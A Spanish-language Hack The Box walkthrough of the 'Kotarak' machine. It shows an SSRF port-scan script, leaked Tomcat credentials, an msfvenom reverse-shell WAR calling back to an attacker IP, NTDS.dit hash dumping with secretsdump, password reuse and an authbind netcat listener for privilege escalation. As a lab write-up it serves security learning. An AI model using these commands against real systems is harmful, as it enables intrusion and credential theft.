# Kotarak-HTB

## Nmap

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/6e56c404-d431-4ed5-84b1-40bc05965f91)

## Tomcat

Se encontro un servidor tomcat el panel de administracion usualmente esta en:

> manager/html

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/eee4bc02-9e30-4689-9976-99e543ab922a)

## SSRF

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/cf9f356c-a756-452a-a4de-cbf2dbb99653)

Entonces esto nos permite enumerar puertos con un script

```
#!/bin/bash

for i in $(seq 0  65535); do

#sleep 1
#echo $i

data=$(curl -s  "http://10.129.1.117:60000/url.php?path=localhost:${i}"&)
#echo "El puerto que estamos revisando es: $i"
#curl -s  "http://10.129.1.117:60000/url.php?path=localhost:${i}"

if [ ! -z "$data" ]; then

     echo "El puerto que respondio es el $i-----------"
     echo $data

fi

data=''
wait;
done

echo "Finalizado..."
```

Se encontraron varios puertos abiertos lo mas destacado

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/03665140-1b85-4a53-a508-ba59dfe71d8e)

Vemos que tienenel backup 

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/c5f4b0cb-639d-4f2b-aa59-8e082da841af)

> "admin" password="3@g01PdhB!"

## RCE

### msfvenom

Vamos a crear una payload:

```
msfvenom -l payload | grep java

###
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.80 LPORT=443 -f war -o rev.war

```

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/97b2a1f5-ea8f-4ade-b338-550c33b9521b)


![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/bf99ba3b-941a-4fe0-b4d3-10ff0705b78a)


## Full TTY

Una vez que tenemos acceso nos damos cuenta que falla querer una full tty entonces vamos a usar la de python

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Pero aun no podemos hacer CTR+C ni nada entonces

```
stty -echo raw;fg
```

## RCE

Encontramos los archivos que estan en esa carpeta

```
![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/c6304ea6-3c92-44d4-92a7-a46432b776d0)

```

Ahi encontramos algo que parece ser de AD la ntds.dit que tiene todos los hashes de los usuarios en el dominio

### Impacket

Para  obtener los hashes dentro de la ntds.dit usaremos secretsdump

```
impacket-secretsdump -ntds ntds.dit -system system.bin LOCAL
```

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/aae3fcae-7c56-4ae3-8bc5-fe2fd3ca1ae6)

Siempre que se pueda intenta re utilizar contraseñas ademas de usar paginas para crackear los passwords

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/ec5ca6c7-8450-4637-9b6a-6a40b9381927)

## Privilege escalation 

Ya tenemos un password y ademas vimos que estaba un usuario atanas intenta reulitizar la contraseña

>f16tomcat!
> Password123!

Y aqui no se puede conectar mediante SSH se tiene que conectar mediate cambio de usuario

```
su atanas

# f16tomcat!


```

Enumerando un poco nos damos cuenta que existe un wget que hace una peticion con una version vulnerable.Ojo no podemos poner a la escucha un puerto para ver que onda con el wget pero tenemos una herramienta que se llama authbind.

> /etc/authbind/byport/

Checa los puertos dentro de esa carpeta que se pueden poner a la escucha sin necesidad de ser root para abrir sockets.ls 

```
authbind nc -lvnp 80
```

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/31988c78-9408-466f-8c7b-00a8d0d1653b)

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/28e7138c-6450-44d8-97c4-dd59f797db64)

Buscando esa version en especifico es vulnerable

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/5825c70a-24c8-4a03-8e43-c59e3846caa0)

Utilizamos el exploit que vienen ahi es un exploit que se aprovebha e la re direccion ya no tiene caso escribir aqui  mas ve el write up

![image](https://github.com/gecr07/Kotarak-HTB/assets/63270579/5f3853a0-f21f-4596-a96c-f1233514578f)

## DD ejemplo

Aqui en este write esta un ejemplo excelente de como usar dd y mover un file system para despues ver la flag dentro de ese contenedor

> https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html












































